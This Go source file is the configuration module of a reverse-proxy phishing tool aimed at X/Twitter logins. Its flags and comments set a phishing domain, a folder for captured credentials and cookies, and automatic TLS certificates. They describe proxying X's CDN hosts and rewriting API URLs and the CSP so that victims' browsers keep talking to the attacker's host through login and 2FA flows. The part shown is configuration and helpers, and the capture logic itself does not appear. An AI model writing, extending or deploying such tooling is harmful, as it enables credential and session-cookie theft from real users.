package main

import (
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"
)

// config holds all runtime configuration for the phishing reverse proxy.
type config struct {
	listenAddr  string
	phishDomain string // e.g. "x-login.example.com" (your domain the victim hits)
	targetURL   *url.URL

	// TLS termination
	certFile string
	keyFile  string

	// Whether to terminate TLS via Let's Encrypt autocert (needs public domain)
	useAutocert bool

	// Lures directory where captured data is written.
	dataDir string

	// Origin hosts we proxy to (x.com and twitter.com).
	origins []string

	// insecure is true when running without TLS (plain HTTP), used to strip
	// the Secure flag from cookies and relax upgrade-insecure-requests.
	insecure bool
}

func parseConfig() *config {
	var (
		addrFlag     = flag.String("addr", "", "Listen address (e.g. :443 or :8080). Overrides ADDR.")
		domainFlag   = flag.String("domain", "", "Your phishing domain (e.g. x-login.example.com). Overrides PHISH_DOMAIN.")
		certFlag     = flag.String("cert", "", "Path to TLS cert file. Overrides CERT_FILE.")
		keyFlag      = flag.String("key", "", "Path to TLS key file. Overrides KEY_FILE.")
		autocertFlag = flag.Bool("autocert", false, "Use Let's Encrypt autocert for TLS (requires public domain).")
		dataFlag     = flag.String("data", "", "Directory for captured credentials/cookies. Overrides DATA_DIR.")
		targetFlag   = flag.String("target", "", "Primary target origin (default https://x.com).")
	)
	flag.Parse()

	listenAddr := firstNonEmpty(*addrFlag, os.Getenv("ADDR"), normalizeAddr(envOr("PORT", ":8080")))
	phishDomain := firstNonEmpty(*domainFlag, os.Getenv("PHISH_DOMAIN"), os.Getenv("RAILWAY_PUBLIC_DOMAIN"), "")
	certFile := firstNonEmpty(*certFlag, os.Getenv("CERT_FILE"), "")
	keyFile := firstNonEmpty(*keyFlag, os.Getenv("KEY_FILE"), "")
	dataDir := firstNonEmpty(*dataFlag, os.Getenv("DATA_DIR"), "./lures")

	targetStr := firstNonEmpty(*targetFlag, os.Getenv("TARGET"), "https://x.com")
	targetURL, err := url.Parse(targetStr)
	if err != nil {
		log.Fatalf("invalid target URL %q: %v", targetStr, err)
	}
	if targetURL.Scheme == "" || targetURL.Host == "" {
		log.Fatalf("target URL must include scheme and host, got %q", targetStr)
	}

	if phishDomain == "" {
		// Not fatal: the proxy resolves the victim's actual host per request
		// (from the Host header), so it works even without an explicit domain.
		// This is the normal case on Railway, where the public domain isn't
		// exposed to the container as an env var.
		log.Printf("WARNING: no -domain/PHISH_DOMAIN set; rewrites will use the victim's Host header")
	} else {
		// Normalize: strip scheme/path if present.
		phishDomain = hostOnlyStr(phishDomain)
	}

	if err := os.MkdirAll(dataDir, 0o755); err != nil {
		log.Fatalf("cannot create data dir %q: %v", dataDir, err)
	}

	return &config{
		listenAddr:  listenAddr,
		phishDomain: phishDomain,
		targetURL:   targetURL,
		certFile:    certFile,
		keyFile:     keyFile,
		useAutocert: *autocertFlag,
		dataDir:     dataDir,
		// Origins we proxy and rewrite. x.com / twitter.com serve the SPA HTML,
		// API responses, and login/2FA flows. twimg.com (abs.twimg.com,
		// pbs.twimg.com, video.twimg.com) and pscp.tv are the static CDN hosts
		// that serve the JavaScript bundle and media. We MUST proxy twimg.com
		// too: the X JS bundle it serves contains hardcoded absolute URLs
		// (api.x.com, jf.x.com, ...). If we let the browser fetch that JS
		// directly from the CDN, those URLs are never rewritten, so the browser
		// hits the real X API and CSP (which we rewrote to only allow the phish
		// host) blocks the requests — exactly the "connect-src violation" the
		// SPA shows. Proxying twimg.com lets us rewrite api.x.com -> phish
		// inside the JS, so the browser keeps talking to us.
		origins:  []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		insecure: *autocertFlag == false && certFile == "" && keyFile == "",
	}
}

// normalizeAddr ensures an address string has a leading ":" so it binds on
// all interfaces. Railway injects PORT as a bare number (e.g. "3000").
func normalizeAddr(addr string) string {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return addr
	}
	if strings.HasPrefix(addr, ":") {
		return addr
	}
	return ":" + addr
}

// hostOnlyStr strips scheme and path, returning just host[:port].
func hostOnlyStr(s string) string {
	s = strings.TrimSpace(s)
	if !strings.Contains(s, "://") {
		s = "https://" + s
	}
	u, err := url.Parse(s)
	if err != nil {
		return s
	}
	return u.Host
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

// splitHostPort splits "host:port" into host and port.
func splitHostPort(addr string) (string, string, error) {
	i := strings.LastIndexByte(addr, ':')
	if i == -1 {
		return addr, "", fmt.Errorf("no port in %q", addr)
	}
	return addr[:i], addr[i+1:], nil
}
